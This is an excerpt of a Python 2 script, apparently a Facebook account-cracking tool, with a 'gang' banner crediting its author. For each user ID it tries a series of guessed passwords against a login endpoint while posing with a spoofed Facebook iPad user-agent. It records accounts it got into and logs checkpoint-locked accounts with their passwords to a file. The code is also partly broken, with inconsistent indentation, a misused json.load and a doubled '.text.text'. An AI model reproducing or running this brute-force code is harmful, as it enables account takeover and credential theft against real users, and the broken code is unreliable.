...
header = {
    ...
    'user-agent': 'Mozilla/5.0 (iPad; U; CPU iPhone OS 5_1_1 like Mac OS X; en_US) AppleWebKit (KHTML, like Gecko) Mobile [FBAN/FBForIPhone;FBAV/4.1.1;FBBV/4110.0;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/5.1.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBSF/1.0;]',
...
##### INTRO #####
logo ="""
\033[1;93m     o      ooooo  oooo ooooo  
\033[1;92m    888       888  88    888  
\033[1;93m   8  88        888      888  
\033[1;94m  8oooo88      88 888    888  
\033[1;93mo88o  o888o o88o  o888o o888o 
\033[1;91m╚═╝░░░░░╚═╝░╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
-----------------------------------------------
  AUTHER   :::     AHMADXZEESHAN
 FACEBOOK  :::     MALIK AHMAD AWAN
 GANG     :::     BAZIGAAR007
    HATERZ DON'T CALL ME
-----------------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def reg():
    ...
    if to in r:
        ...
        os.system('xdg-open https://www.facebook.com/malikahmad.awan.5688476')
        reg()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
				oks.append(uid+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass1	
					...
					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
		                        q = json.load(data)
					if 'access_token' in q:
						print '\033[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'	
						oks.append(uid+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass2
							cek = open("out/CP.txt", "a")
							cek.write(uid+"|"+pass2+"\n")
							cek.close()
							...
							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
		                                        q = json.load(data)
							if 'access_token' in q:
								print '\033[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
								oks.append(uid+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass3	
									cek = open("out/CP.txt", "a")
									cek.write(uid+"|"+pass3+"\n")
									cek.close()
									...
									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
		                                                        q = json.load(data)
									if 'access_token' in q:
										print '\033[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'	
										oks.append(uid+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass4
											cek = open("out/CP.txt", "a")
											cek.write(uid+"|"+pass4+"\n")
											cek.close()
											...
											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
		                                                                        q = json.load(data)
											if 'access_token' in q:
												print '\033[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
												oks.append(uid+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass5	
													cek = open("out/CP.txt", "a")
													cek.write(uid+"|"+pass5+"\n")
													cek.close()
													...
													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
		                                                                                        q = json.load(data)
													if 'access_token' in q:
														print '\033[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
														oks.append(uid+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass6	
															cek = open("out/CP.txt", "a")
															cek.write(uid+"|"+pass6+"\n")
															cek.close()
															...
															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text.text
		                                                                                                        q = json.load(data)
															if 'access_token' in q:
																print '\033[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
																oks.append(uid+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass7
																	cek = open("out/CP.txt", "a")
                                                                                                                                        cek.write(uid+"|"+pass7+"\n")
																	cek.close()
